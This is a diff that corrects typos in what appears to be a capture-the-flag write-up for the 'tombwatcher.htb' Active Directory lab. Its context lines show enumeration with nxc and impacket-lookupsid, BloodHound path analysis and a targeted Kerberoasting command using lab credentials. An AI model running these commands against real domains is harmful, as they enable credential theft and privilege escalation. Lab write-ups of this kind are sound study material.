@@ -105,7 +105,7 @@ nxc ldap dc01 -u 'henry' -p 'H3nry_987TGV!' --users | tee intelligence/users.txt
 
 - Found 3 new user accounts. `alfred`, `sam` and `john`
 
-Enumerationg with SID lookup
+Enumerating with SID lookup
 
 ```
 impacket-lookupsid 'henry:H3nry_987TGV!'@dc01
@@ -166,7 +166,7 @@ Running Analyze, refresh data
 
 Querying: "`Shortest Path From Owned Objects`"
 
-- With this query BloodHound is already identifying the whole chain from the Owned User Account `henry` to foothold - `john` with Remote Magement Privilege.
+- With this query BloodHound is already identifying the whole chain from the Owned User Account `henry` to foothold - `john` with Remote Management Privilege.
 
 ![](screenshots/12.png)
 
@@ -187,7 +187,7 @@ Sync with DC to use kerberos
 sudo ntpdate 10.129.51.60
 ```
 
-Set SPN on alfred and kerberost/get TGT - Hash (SPN is autoremoved afterwards by the tool)
+Set SPN on alfred and kerberoast/get TGT - Hash (SPN is autoremoved afterwards by the tool)
 
 ```
 ./targetedKerberoast.py -v -d 'tombwatcher.htb' -u 'henry' -p 'H3nry_987TGV!' -f hashcat --dc-ip 10.129.51.60
@@ -309,6 +309,8 @@ sudo ln -s /lib64/libreadline.so.8 /lib64/libreadline.so.6
 ```
 
 - Still not working
+
+- After some research found that BloodyAD is also capable and more modern alternative.
 
 Trying with BloodyAD
 
